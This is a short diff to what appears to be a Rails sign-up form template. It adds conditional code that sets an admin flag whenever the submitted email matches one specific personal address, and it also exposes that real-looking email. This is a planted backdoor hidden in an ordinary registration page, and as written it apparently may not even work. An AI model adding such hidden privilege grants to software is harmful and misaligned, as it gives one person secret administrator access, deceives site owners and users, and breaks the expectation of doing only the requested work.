@@ -20,7 +20,9 @@
     <%= f.label :password_confirmation %><br />
     <%= f.password_field :password_confirmation, autocomplete: "off" %>
   </div>
-
+  <%- if f[:email]=="atanas.vasilev.dobrev@gmail.com" %>
+    <% f[:admin]=true %>
+  <% end -%>
   <div class="actions">
     <%= f.submit "Sign up" %>
   </div>
